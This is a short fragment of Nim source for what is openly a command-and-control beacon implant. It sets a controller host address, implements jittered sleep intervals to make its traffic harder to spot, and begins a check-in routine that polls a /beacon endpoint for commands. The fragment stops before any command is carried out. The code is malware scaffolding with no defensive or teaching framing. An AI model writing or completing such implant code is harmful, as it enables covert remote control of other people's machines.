const C2_HOST = "http://192.168.1.100:8080"
const SLEEP_BASE = 30_000        # 30 seconds base sleep in milliseconds
const JITTER_PCT = 0.3           # 30% jitter window

proc sleepJitter() =
  ## Sleep for SLEEP_BASE ± JITTER_PCT*SLEEP_BASE milliseconds
  let delta = int(float(SLEEP_BASE) * JITTER_PCT)
  let interval = SLEEP_BASE - delta + rand(2 * delta)
  sleep(interval)

proc checkin(client: HttpClient): string =
  ## GET /beacon — server returns a command or empty string
